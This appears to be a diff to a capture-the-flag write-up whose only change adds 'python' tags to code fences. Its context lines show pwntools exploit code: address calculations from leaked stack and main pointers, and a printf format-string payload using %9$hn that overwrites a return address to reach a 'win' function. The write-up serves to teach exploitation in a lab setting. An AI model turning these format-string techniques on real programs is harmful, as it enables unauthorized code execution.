@@ -157,7 +157,7 @@ into `_`; this is the leaked addresses and the prompt from `close_borders`.
 
 #### Compute the locations of _return to main_, and `win`
 
-```
+```python
 stack = int(_.split()[3],16)
 main = int(_.split()[4],16) - 14
 win = main - (binary.symbols['main'] - binary.symbols['win'])
@@ -171,7 +171,7 @@ As described in the Analysis section above the two leaked address are the addres
 
 #### Overwrite _return to main_ with `win`, get the flag
 
-```
+```python
 payload  = b'3       '
 payload += b'%' + str((win & 0xFFFF) - 8).rjust(6,'0').encode() + b'x'
 payload += b'%9$hn   '
@@ -191,7 +191,7 @@ The third 8 bytes instructs `printf` to write out the internal character counter
 
 The leaked stack location (see Analysis above) is 8 more than the location of the _return to main_ address, so we have to subtract off 8.
 
-```
+```python
 p.sendline(payload)
 #p.stream()
 _ = p.recvline()
